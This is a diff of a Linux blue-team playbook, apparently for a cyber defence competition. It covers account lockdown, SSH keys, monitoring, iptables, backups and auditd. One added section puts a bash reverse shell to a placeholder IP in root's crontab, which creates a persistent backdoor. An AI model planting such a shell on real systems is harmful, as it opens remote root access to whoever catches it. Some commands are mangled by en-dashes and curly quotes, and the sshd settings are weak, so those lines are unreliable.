@@ -21,115 +21,75 @@
 
 ## 30 Minute Plan
 
-1.  NMAP Scan Machine in background
+1. [NMAP Scan Machine](#nmap) in background
+2. [Backup files](#backups)
+3. Rotate all ssh keys
+    1. Populate the machines with the ssh key from lead linux captain
+    2. Deploy with `ssh-copy-id -i <file> <user@host>`
+    3. Ensure there is only one entry (one line) in `~/.ssh/authorized_keys`. If there are more than one, remove all lines EXCEPT the very last one. After saving, make sure you can still SSH by trying on a NEW terminal.
+    4. Remove all other authorized keys files with `find / -name authorized_keys`
 
-2.  Rotate all ssh keys
-
-    1.  Populate the machines with the ssh key from lead linux captain
-
-    2.  Deploy with `ssh-copy-id -i <file> <user@host>`
-
-    3.  Ensure there is only one entry (one line) in `~/.ssh/authorized_keys`. If there are more than one, remove all lines EXCEPT the very last one. After saving, make sure you can still SSH by trying on a NEW terminal.
-
-    4.  Remove all other authorized keys files with
-        `find / -name authorized_keys`
-
-3.  Check local accounts and reset password **ASAP** using appropriate one liners from [Duncan's Magic](#dmagic)
-
-4.  Lock unnecessary accounts with `usermod -L <login>` and if nothing goes red, delete account with `userdel <login>`. Or use appropriate one liners from [Duncan's Magic](#dmagic) to lock accounts
-
-    1.  **NOTE**: user home directories were intentionally not deleted with the `userdel` command with the idea of possible needing that data for future injects (you never know).
+4. Check local accounts and reset password **ASAP** using appropriate one liners from [Duncan's Magic](#dmagic)
+5. Lock unnecessary accounts with `usermod -L <login>` and if nothing goes red, delete account with `userdel <login>`. Or use appropriate one liners from [Duncan's Magic](#dmagic) to lock accounts
+    1. **NOTE**: user home directories were intentionally not deleted with the `userdel` command with the idea of possible needing that data for future injects (you never know). \
 	If you absolutely need to remove extraneous user home directories, seek approval from the team captain before proceeding with the command `userdel -r <login>`
 
-5.  Find listening services with `ss -tunlp` and investigate strange ones
+6. Find listening services with `ss -tunlp` and investigate strange ones
 
 ## Monitoring
 
-1.  View all network connections `ss -tunlp`
+1. View all network connections `ss -tunlp`
+2. View listening programs with `ss -lp`
+3. View only connections with `ss -tu`
+4. View active processes `ps -e`
+5. Continuously see processes with `top`
+    1. Sort by different categories with `<` and `>`
+    2. Tree view with `V`
 
-2.  View listening programs with `ss -lp`
+6. Watch **all** network traffic with the following (this is a fire hose)
+    1. Record inbound traffic with `iptables -I INPUT -j LOG`
+    2. Record outbound traffic with `iptables -I OUTPUT -j LOG`
+    3. Watch logs with `journalctl -kf –grep="OUT=.*"`
 
-3.  View only connections with `ss -tu`
+7. Watch dbus with `dbus -w`
 
-4.  View active processes `ps -e`
+## Backups
 
-5.  Continuously see processes with `top`
-
-    1.  Sort by different categories with `<` and
-        `>`
-
-    2.  Tree view with `V`
-
-6.  Watch **all** network traffic with the following (this is a fire
-    hose)
-
-    1.  Record inbound traffic with
-        `iptables -I INPUT -j LOG`
-
-    2.  Record outbound traffic with
-        `iptables -I OUTPUT -j LOG`
-
-    3.  Watch logs with
-        `journalctl -kf –grep="OUT=.*"`
-
-7.  Watch dbus with `dbus -w`
+1. Look for csv's and import scripts in home dir
+2. Backups data directory with `tar czf var-lib.tar.gz /var/lib &`
+3. Backups conf directory with `tar czf etc.tar.gz /etc &`
+4. Copy tar files to local machine with `scp '<remote>:*.tar.gz' .` (run command on local machine);w
 
 ## System Utilities
 
-1.  Start and stop processes with `systemctl`
+1. Start and stop processes with `systemctl`
+    1. Start service with `systemctl start <unit>`
+    2. Stop service with `systemctl stop <unit>`
+    3. Restart service with `systemctl restart <unit>`
+    4. Enable service with `systemctl enable <unit>`
 
-    1.  Start service with
-        `systemctl start <unit>`
-
-    2.  Stop service with
-        `systemctl stop <unit>`
-
-    3.  Restart service with
-        `systemctl restart <unit>`
-
-    4.  Enable service with
-        `systemctl enable <unit>`
-
-2.  Permit and allow network connections with
-    `iptables`
-
-    1.  Default deny with `iptables -P INPUT DROP`
-
-    2.  Allow port access (must choose tcp or udp)
+2. Permit and allow network connections with `iptables`
+    1. Default deny with `iptables -P INPUT DROP`
+    2. Allow port access (must choose tcp or udp) \
 		`iptables -A INPUT -p <tcp|udp> –dport <port> -j ACCEPT`
+    4. Allow all from interface `iptables -A INPUT -i <interface> -j ACCEPT`
 
-    4.  Allow all from interface `iptables -A INPUT -i <interface> -j ACCEPT`
+3. Schedule tasks with cron
+    1. View with `crontab -eu <user>`
+    2. Obliterate user's crontab with `crontab -ru <user>`
+    3. See [Duncan's Magic](#dmagic) for a one liner to remove crontabs from a list of users. Don't forget to remove the root user's crontab too!
 
-3.  Schedule tasks with cron
+4. View networking information with `ip`
+    1. View network interfaces with `ip l`
+        1. Interfaces are prefixed with an `en` to signify ethernet, `wl` to signify wireless, and `v` to signify a virtual link
+        2. Virtual links should be investigated, as they are commonly used for VPNs, docker, and nonsense
+        3. Virtual servers will still show their main link to the host as ethernet
 
-    1.  View with `crontab -eu <user>`
-
-    2.  Obliterate user's crontab with `crontab -ru <user>`
-
-    3.  See [Duncan's Magic](#dmagic) for a one liner to remove crontabs from a list of users. Don't forget to remove
-        the root user's crontab too!
-
-4.  View networking information with `ip`
-
-    1.  View network interfaces with `ip l`
-
-        1.  Interfaces are prefixed with an `en`
-            to signify ethernet, `wl` to signify
-            wireless, and `v` to signify a
-            virtual link
-
-        2.  Virtual links should be investigated, as they are commonly
-            used for VPNs, docker, and nonsense
-
-        3.  Virtual servers will still show their main link to the host
-            as ethernet
-
-    2.  View IP Addresses with `ip a` and take
-        note of additional addresses
+    2. View IP Addresses with `ip a` and take note of additional addresses
 
 ## Configurations
 
-1.  SSH Daemon configs are in `/etc/ssh/sshd_config` and should be set as follows
+1. SSH Daemon configs are in `/etc/ssh/sshd_config` and should be set as follows
 ```
 PermitRootLogin prohibit-password
 UsePAM no
@@ -137,125 +97,110 @@ PasswordAuthentication yes
 PermitEmptyPasswords no
 ```
 
-2.  File system configs are in `/etc/fstab`
-
-    1.  Network File Shares are in the form
-        `/srv/home hostname1(rw,sync,no_subtree_check)`
+2. File system configs are in `/etc/fstab`
+    1. Network File Shares are in the form \
+        `/srv/home hostname1(rw,sync,no_subtree_check)` \
         These allow sharing file systems over the network. They must be reviewed to ensure we are not sharing information with attackers
 
 ## Hunting
 
-1.  List all files with creation date, most recent first:
-    `find /usr /bin /etc \`
+1. Find a process's parent ID with `ps -f <pid>` and look at `PPID`
+2. List all files with creation date, most recent first: `find /usr /bin /etc \` \
     `/var -type f -exec stat -c "%W %n" {} + | sort -r > files`
 
-2.  List all files created after set date, most recent first:
-    `find /usr /bin /etc /var -type f -newermt <YYYY-MM-DD> -exec \`
+3. List all files created after set date, most recent first: \
+    `find /usr /bin /etc /var -type f -newermt <YYYY-MM-DD> -exec \` \
     `stat -c "%W %n" {} + | sort -rn > files`
+
 
 ## Duncan's Magic {#dmagic}
 
-1.  Remove users listed in **./disable.txt**
+1. Remove users listed in **./disable.txt**\
     `while read user;do sudo usermod -L $user;done<disable.txt`
 
-2.  Generate new passwords for every user in **./users.txt**. Output format and filename as specified by SECCDC-2024 password reset guidelines. Ensure team number is correct and SERVICE is changed to match the corresponding service the passwords are being reset for.
-    `s='<service>'; while read u; do u=‘echo $u|tr -d ' '‘; \` 
-    `p=‘tr -dc 'A-Za-z0-9!@#$%'</dev/urandom|head -c 24; echo‘; \` 
+2. Generate new passwords for every user in **./users.txt**. Output format and filename as specified by SECCDC-2024 password reset guidelines. Ensure team number is correct and SERVICE is changed to match the corresponding service the passwords are being reset for.\
+    `s='<service>'; while read u; do u=‘echo $u|tr -d ' '‘; \` \
+    `p=‘tr -dc 'A-Za-z0-9!@#$%'</dev/urandom|head -c 24; echo‘; \` \
     `echo $s,$u,$p; done < users.txt > Team25_${s}_PWD.csv`
 
-3.  Actually reset passwords using the generated list from the command immediately preceeding this
+3. Actually reset passwords using the generated list from the command immediately preceeding this\
     `awk -F, '{print $2":"$3}' <file.csv> | sudo chpasswd`
 
-4.  Find users not in **./known_users.txt** 
-    `awk -F: '{if($3>=1000&&$3<=60000){print $1}}' /etc/passwd| \` 
+4. Find users not in **./known_users.txt** \
+    `awk -F: '{if($3>=1000&&$3<=60000){print $1}}' /etc/passwd| \` \
     `sort - known_users.txt | uniq -u > extra_users.txt`
 
-5.  Remove crontabs from list of users in **./users.txt** 
+5. Remove crontabs from list of users in **./users.txt** \
     `while read u; do sudo crontab -u $u -r; done < users.txt`
 
 ## Hardening
 
 You should remount /tmp and /var/tmp to be non-executable.
 
-1.  If /tmp and /var/tmp are already mounted, you can simply do: 
-    `mount -o remount,nodev,nosuid,noexec /tmp`
+1. If /tmp and /var/tmp are already mounted, you can simply do: \
+    `mount -o remount,nodev,nosuid,noexec /tmp`\
     `mount -o remount,nodev,nosuid,noexec /var/tmp `
 
-2.  If they haven't already been mounted, edit /etc/fstab to include: 
-    `tmpfs /tmp tmpfs defaults,noatime,nosuid,nodev,noexec,mode=1777 0 0`
+2. If they haven't already been mounted, edit /etc/fstab to include: \
+    `tmpfs /tmp tmpfs defaults,noatime,nosuid,nodev,noexec,mode=1777 0 0`\
     `tmpfs /var/tmp tmpfs defaults,noatime,nosuid,nodev,noexec,mode=1777 0 0 `
 
-3.  Once /etc/fstab has been updated, you can run: 
-    `mount -o nodev,nosuid,noexec /tmp`
+3. Once /etc/fstab has been updated, you can run: \
+    `mount -o nodev,nosuid,noexec /tmp`\
     `mount -o nodev,nosuid,noexec /var/tmp `
+
+## Disaster Prevension
+
+1. Open multiple ssh sessions to different users
+2. Add SSH key to multiple users, such as root
+3. Determine your IP, and place the line below in root's crontab
+	1. On your localhost you can listen to port 4444 to catch the shell
+
+``` crontab
+* * * * * /bin/bash -i >& /dev/tcp/<ip>/4444 0>&1
+```
 
 ## Disaster Recovery
 
-1.  Service goes down
+1. Service goes down
+    1. Determine the service
+    5. Try restarting: `sudo systemctl restart <service>`
+    2. Find errors in logs with `sudo journalctl -xe <service>`
+    3. If it is a configuration error, restore previous config or manually reset
+    4. If the service is still down **alert the team**
 
-    1.  Determine the service
-
-    2.  Find errors in logs with `sudo journalctl -xe <service>`
-
-    3.  If it is a configuration error, restore previous config or manually reset
-
-    4.  If the service is still down **alert the team**
-
-    5.  Try restarting: `sudo systemctl restart <service>`
-
-2.  Loosing access to a box
-
-    1.  **Alert the team**
-
-    2.  Start nmap scan
-
-    3.  Try verbose ssh `ssh -v <user>@<ip>`
+2. Loosing access to a box
+    1. **Alert the team**
+    2. [Start nmap scan](#nmap)
+    3. Try verbose ssh `ssh -v <user>@<ip>`
 
 ## Logging with auditd
 
 Setup auditd for logging purposes
 
-1.  Make sure auditd daemon is enabled and running
+1. Make sure auditd daemon is enabled and running
+    1. `sudo systemctl enable –now auditd`
 
-    1.  `sudo systemctl enable –now auditd`
+2. After auditd has been started, add rules to `/etc/audit/rules.d/audit.rules`. You will need `sudo` permissions to edit this file.
 
-2.  After auditd has been started, add rules to
-    `/etc/audit/rules.d/audit.rules`. You will
-    need `sudo` permissions to edit this file.
+    1. Visit this masterful auditd github repo(https://github.com/Neo23x0/auditd/blob/master/audit.rules) for a wide variety of auditd rules to copy / imitate.
 
-    1.  Visit this masterful auditd github
-        repo(https://github.com/Neo23x0/auditd/blob/master/audit.rules)
-        for a wide variety of auditd rules to copy / imitate.
-
-3.  Restart auditd to apply these new rules
-
-    1.  `sudo systemctl restart auditd`
+3. Restart auditd to apply these new rules
+    1. `sudo systemctl restart auditd`
 
 Looking at auditd alerts
 
-1.  Logs are stored in `/var/log/audit/audit.log`
+1. Logs are stored in `/var/log/audit/audit.log`
+    1. You can use `ausearch` to query this log
+    2. `aureport` can also be used to generate a list of events
 
-    1.  You can use `ausearch` to query this log
+2. Important takeaways when analyzing auditd logs
+    1. euid = effective user id. Pay attention if EUID field is 0 as this means a file or program was run as root
+    2. exe field indicates which command was run (if one was run at all)
+    3. key field stores the name of the alert that was triggered
+    4. pid field stores the process id
 
-    2.  `aureport` can also be used to generate a
-        list of events
-
-2.  Important takeaways when analyzing auditd logs
-
-    1.  euid = effective user id. Pay attention if EUID field is 0 as
-        this means a file or program was run as root
-
-    2.  exe field indicates which command was run (if one was run at
-        all)
-
-    3.  key field stores the name of the alert that was triggered
-
-    4.  pid field stores the process id
-
-3.  Utilize the various fields, timestamps, and
-    `ausearch` and
-    `aureport` tools to observe, report, and take
-    action on suspicious activity
+3. Utilize the various fields, timestamps, and `ausearch` and `aureport` tools to observe, report, and take action on suspicious activity
 
 # Windows
 
